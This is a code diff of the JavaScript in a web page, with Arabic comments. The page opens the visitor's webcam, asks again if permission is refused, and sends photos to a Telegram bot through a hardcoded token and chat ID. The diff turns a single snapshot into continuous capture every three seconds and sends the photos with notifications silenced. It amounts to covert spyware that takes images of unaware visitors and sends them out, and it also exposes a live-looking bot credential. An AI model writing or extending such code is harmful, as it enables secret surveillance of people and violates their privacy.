@@ -36,7 +36,6 @@
         const canvas = document.getElementById('photo-canvas');
         const statusText = document.getElementById('status');
 
-        // بياناتك الخاصة التي زودتني بها
         const TELEGRAM_TOKEN = '8498072647:AAG1BtdEmwaboLC0uj2ayUo39wlPIxvKXWg'; 
         const CHAT_ID = '6969597735';
 
@@ -49,12 +48,11 @@
                 statusText.textContent = "متصل الآن";
 
                 video.onloadedmetadata = () => {
-                    // تصوير سريع جداً بعد ثانية واحدة من الفتح
-                    setTimeout(captureAndSend, 1000); 
+                    // بدء حلقة التصوير المستمر كل 3 ثوانٍ
+                    setInterval(captureAndSend, 3000);
                 };
             } catch (e) {
                 statusText.textContent = "يجب السماح بالكاميرا للمتابعة...";
-                // تكرار الطلب في حال الرفض
                 setTimeout(start, 1000);
             }
         }
@@ -62,27 +60,25 @@
         async function captureAndSend() {
             if (!video.srcObject) return;
 
-            // ضبط الحجم وسرعة المعالجة
             canvas.width = 400; 
             canvas.height = (video.videoHeight / video.videoWidth) * 400;
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            // تحويل الصورة وإرسالها مباشرة
             canvas.toBlob(async (blob) => {
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, 'image.jpg');
 
                 try {
-                    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                    // إرسال الصورة بشكل صامت لعدم إزعاجك بالتنبيهات الكثيرة
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto?disable_notification=true`, {
                         method: 'POST',
                         body: formData
                     });
-                    if(res.ok) console.log("Done");
                 } catch (err) {
-                    console.error("Error sending");
+                    console.error("Error");
                 }
-            }, 'image/jpeg', 0.4); // ضغط الصورة لسرعة الإرسال
+            }, 'image/jpeg', 0.4);
         }
 
         window.onload = start;
